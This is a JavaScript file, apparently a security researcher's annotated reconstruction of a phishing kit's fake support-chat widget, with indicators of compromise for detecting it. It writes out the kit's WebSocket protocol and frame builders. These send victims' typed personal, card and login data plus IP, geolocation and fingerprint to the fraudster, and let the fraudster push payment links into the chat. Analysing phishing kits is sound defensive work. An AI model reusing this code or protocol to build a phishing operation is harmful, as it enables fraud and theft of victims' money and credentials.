/**
 * helpdeskChat.js
 * -----------------------------------------------------------------------------
 * Technical reconstruction for security research — source documentation, READ-ONLY, NOT EXECUTABLE.
 *
 * Source chunks:
 *   - kit-source/decompressed/a3b309f4fb71...txt  (helpdesk widget + chat protocol,
 *                                                module 148748)
 *   - kit-source/decompressed/5addca557de7...txt  (ad:event funnel telemetry frames)
 *   - kit-source/decompressed/d0efa970927f...txt  (payment-modal ad:event)
 *
 * SUBSYSTEM: Realtime transport -- helpdesk chat protocol + victim telemetry.
 *
 * WHAT THIS IS: a fake "customer support" chat widget embedded in the phishing
 * page. The victim believes they are chatting with the marketplace's support
 * team; in reality a human OPERATOR (the fraudster) is on the other end of the
 * /ws/helpdesk socket, can push messages, payment links, images, can open/close
 * the widget remotely, and watches a live activity feed of the victim.
 *
 * The widget runs inside an <iframe> and uses window.parent.postMessage(...) to
 * talk to the host phishing page (open/close chat, show notifications, play a
 * notification sound, show a message preview, open a media lightbox).
 * -----------------------------------------------------------------------------
 */

/* ===========================================================================
 * 1. EVENT BUS  (minified class `f`, singleton `m`)
 * ===========================================================================
 * A tiny type -> Set<handler> dispatcher. The WS provider's onMessage is wired
 * to eventBus.dispatch(frame), so every inbound frame.type routes to handlers
 * registered via sync.on(type, handler).
 */
class EventBus {
  constructor() {
    this.typeToHandlers = new Map();
  }
  on(type, handler) {
    if (!this.typeToHandlers.has(type)) this.typeToHandlers.set(type, new Set());
    this.typeToHandlers.get(type)?.add(handler);
  }
  off(type, handler) {
    const set = this.typeToHandlers.get(type);
    if (!set) return;
    set.delete(handler);
    if (set.size === 0) this.typeToHandlers.delete(type);
  }
  dispatch(frame) {
    const handlers = this.typeToHandlers.get(frame.type);
    if (!handlers || handlers.size === 0) return;
    for (const handler of handlers) {
      try {
        handler(frame.data, frame);
      } catch (e) {
        // handler errors are swallowed
      }
    }
  }
}

/* ===========================================================================
 * 2. INBOUND EVENT TYPES (server -> client) handled by the helpdesk widget
 * ===========================================================================
 * All strings preserved verbatim. These are the `frame.type` values the kit
 * subscribes to via sync.on(...). IOCs for traffic analysis.
 */
const HELPDESK_INBOUND_EVENTS = {
  // transport/control (handled inside WebSocketProvider, see that file)
  connected: "connected",       // handshake ack
  disconnect: "disconnect",     // server-directed disconnect {reason,message,reconnectAfter}
  error: "error",               // {error, error_code}

  // chat application events
  messages: "messages",                 // full/partial message list (array)
  message_read: "message_read",         // {messages:[{id,is_read}]}
  message_delete: "message_delete",     // {message_ids:[...]}
  send_message_result: "send_message_result", // boolean: did our send succeed

  // remote widget control (operator opens/closes the victim's chat window)
  open_helpdesk_widget: "open_helpdesk_widget",
  close_helpdesk_widget: "close_helpdesk_widget",
};

/* ===========================================================================
 * 3. OUTBOUND MESSAGE FRAMES (client -> server)
 * ===========================================================================
 * Verbatim frame shapes the victim's browser sends.
 */
const HELPDESK_OUTBOUND = {
  // Victim sends a chat message. data = { text?, image_file?(base64 dataURL), temp_id }
  // temp_id is a client-generated id: 1000*Date.now() + floor(1000*random()).
  SEND_MESSAGE: (data) => ({ type: "send_message", data }),

  // Mark operator messages as read. data = { message_ids:[...] }
  MARK_AS_READ: (messageIds) => ({ type: "mark_as_read", data: { message_ids: messageIds } }),

  // Poll for messages, excluding ids already held. data = { skip_ids:[...] }
  GET_MESSAGES: (skipIds = []) => ({ type: "get_messages", data: { skip_ids: skipIds } }),

  // Periodic victim "activity"/telemetry beacon (see section 5).
  ACTIVITY: (data) => ({ type: "activity", data }),
};

/* ===========================================================================
 * 4. THE `ad:event` FUNNEL TELEMETRY FRAME  (chunks 5addca / d0efa970)
 * ===========================================================================
 * Separate from chat: as the victim progresses through the phishing funnel,
 * the kit emits funnel-stage events to the operator over the sync channel.
 *
 * Frame shape (VERBATIM):
 *   { type: "ad:event",
 *     data: { visor_id, ad_id, event_type, event_data } }
 *
 *   - visor_id   : observed always "" in the bundle (operator/"supervisor" id,
 *                  populated server-side). RECONSTRUCTED-APPROX meaning.
 *   - ad_id      : the campaign / phishing-ad id (ad.id)
 *   - event_type : one of EventTypes (see eventTypes.js), e.g. "enter_full_name"
 *   - event_data : stage-specific captured data. For payment-modal events it is
 *                  { dialog_type, data:{ [dialog_type]: value }, service_method }.
 *
 * Canonical helper reconstructed from chunk 5addca:
 *   function sendAdEvent(eventType, eventData) {
 *     const data = { visor_id:"", ad_id: ad?.id, event_type: eventType, event_data: eventData };
 *     sync.send({ type:"ad:event", data });
 *     return true;
 *   }
 * THIS is the channel that exfiltrates the victim's typed PII / card / BLIK /
 * login / verification data, keystroke-stage by keystroke-stage.
 */
function buildAdEventFrame(adId, eventType, eventData, visorId = "") {
  return {
    type: "ad:event",
    data: { visor_id: visorId, ad_id: adId, event_type: eventType, event_data: eventData },
  };
}

/* ===========================================================================
 * 5. VICTIM ACTIVITY / TELEMETRY BEACON  (chunk a3b309f4)
 * ===========================================================================
 * A hook (useActivityTracker, minified) runs while the helpdesk is mounted. It
 * polls every intervalMs (default 2000ms = 2e3) and, IF the tab is visible and
 * there was activity in the last 2 minutes, sends an "activity" beacon:
 *
 *   {
 *     type: "activity",
 *     data: {
 *       date:        <last activity ISO, sliced to seconds> + "Z",
 *       fingerprint: getOrCreateFingerprint(),     // persistent browser fp
 *       ipinfo:      await resolveClientIPAndGeo(), // victim IP + geo (ipinfo)
 *       user_agent:  await getUserAgent(),          // navigator.userAgent
 *     }
 *   }
 *
 * Helpers live in chunk a3b309f4 / module 826578 (DEFAULT_IP_INFO, ActivityTracker,
 * getOrCreateFingerprint, resolveClientIPAndGeo, getUserAgent). This is how the
 * operator sees a live "victim is online / here is their IP+geo+fingerprint" feed.
 */
function buildActivityFrame(activityTracker, fingerprint, ipinfo, userAgent) {
  const lastDate = (activityTracker?.getLastActivityDate() ?? new Date())
    .toISOString()
    .slice(0, 19) + "Z";
  return {
    type: "activity",
    data: { date: lastDate, fingerprint, ipinfo, user_agent: userAgent },
  };
}

/* ===========================================================================
 * 6. WIDGET WIRING  (chunk a3b309f4)
 * ===========================================================================
 * On mount (per ad), the helpdesk component:
 *   sync.init({ provider:"websocket",
 *               url:`${getWsBaseUrl()}/ws/helpdesk`,
 *               params:{ ad_id: ad.id.toString() } });
 * then registers handlers:
 *
 *   sync.on("messages", arr => merge into store, set isFirstMessagesReceived,
 *           and for a NEW unread operator message:
 *             - postMessage HD_SHOW_MESSAGE_PREVIEW (preview bubble in parent)
 *             - if localStorage.hd_user_interacted==="true": play notify audio
 *               (<audio data-id="hd-notify-audio"> -> /static/helpdesk/audio/blackberry.mp3)
 *             - postMessage "HD_SHOW_NOTIFICATION"
 *             - set [data-id="hd-widget"] has-new-message attribute)
 *   sync.on("message_delete", ({message_ids}) => remove those messages)
 *   sync.on("message_read",   ({messages})    => update is_read_by_client)
 *   sync.on("send_message_result", result     => store.sendMessageResult)
 *   sync.on("error", e => store.error/errorCode)
 *   sync.on("connected", () => clear error)
 *   sync.on("disconnect", e => store.error = e.message ||
 *           "Соединение закрыто" /* RU: "Connection closed" *\/)
 *
 * Remote widget control (operator-driven):
 *   sync.on("open_helpdesk_widget",  () => setWidgetState("open"))
 *   sync.on("close_helpdesk_widget", () => setWidgetState("closed"))
 *
 * Periodic poll: every 1000ms -> GET_MESSAGES(skip_ids = ids already held).
 *
 * iframe <-> parent postMessage protocol (window.parent.postMessage / "*"):
 *   IN  (parent->widget): "HD_OPEN_CHAT", "HD_CLOSE_CHAT",
 *                         {type:"HD_MARK_ALL_AS_READ"}
 *   OUT (widget->parent): "HD_OPEN_CHAT", "HD_CLOSE_CHAT",
 *                         {type:"HD_SHOW_MESSAGE_PREVIEW", message, operatorName},
 *                         "HD_SHOW_NOTIFICATION",
 *                         {type:"HD_OPEN_LIGHTBOX", mediaFiles, initialIndex}
 *
 * Default operator display name fallback (chunk a3b309f4):
 *   "Оператор"  /* RU: "Operator" *\/
 */

/* ===========================================================================
 * 7. MESSAGE RENDERING / DOM MARKERS
 * ===========================================================================
 * Each rendered message carries data-id="hd-message-item" plus ONE of these
 * boolean DOM markers depending on who sent it (from_type):
 *   - operator messages: attribute  hd-message-operator
 *   - client  messages: attribute  hd-message-client
 * (These markers + the data-id="hd-*" attributes are reliable DOM IOCs for
 * detecting this kit's helpdesk widget in a captured page.)
 *
 * A message flagged is_template with template_name including "payment" renders
 * a special "Pay" call-to-action button linking to the operator-supplied URL
 * (data-id="hd-message-payment") -- i.e. the operator pushes a payment link
 * straight into the chat.
 *
 * Other DOM IOCs: data-id values hd-widget, hd-widget-chat, hd-chat-input,
 * hd-attach-input (accepts image/jpeg,image/png,image/jpg, <=10MB), hd-send-btn,
 * hd-connection-status (shows when status !== "open").
 */

// RECONSTRUCTED-APPROX export surface.
export {
  EventBus,
  HELPDESK_INBOUND_EVENTS,
  HELPDESK_OUTBOUND,
  buildAdEventFrame,
  buildActivityFrame,
};
